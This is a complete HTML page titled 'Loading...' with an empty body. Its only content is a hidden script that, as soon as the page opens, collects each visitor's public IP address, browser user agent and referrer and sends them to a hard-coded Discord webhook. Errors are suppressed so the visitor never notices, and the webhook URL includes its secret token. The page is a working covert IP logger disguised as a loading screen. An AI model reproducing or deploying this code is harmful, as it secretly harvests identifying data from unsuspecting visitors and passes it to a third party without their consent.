<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
</head>
<body>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1474176275106238617/IONq73TswuNCjUq3OQX1s7FlKtnNA79ZRtQeG_8sPLvTkJLL8Ym16vw2YEQOoXKriXTp";

(async () => {
  let ip = "unknown";

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (err) {
    // fallback if ipify is down/blocked
    try {
      const res2 = await fetch("https://api64.ipify.org?format=json");
      const data2 = await res2.json();
      ip = data2.ip;
    } catch {}
  }

  const now = new Date().toISOString().slice(0, 19).replace("T", " ");

  const payload = {
    embeds: [{
      title: "New visitor",
      color: 0xFF5555,
      fields: [
        { name: "Time",     value: now + " UTC", inline: true },
        { name: "IP",       value: "`" + ip + "`", inline: true },
        { name: "UA",       value: "```" + navigator.userAgent.slice(0, 300) + "```" },
        { name: "Referrer", value: document.referrer || "direct", inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(() => {});   // silent fail
})();
</script>

</body>
</html>
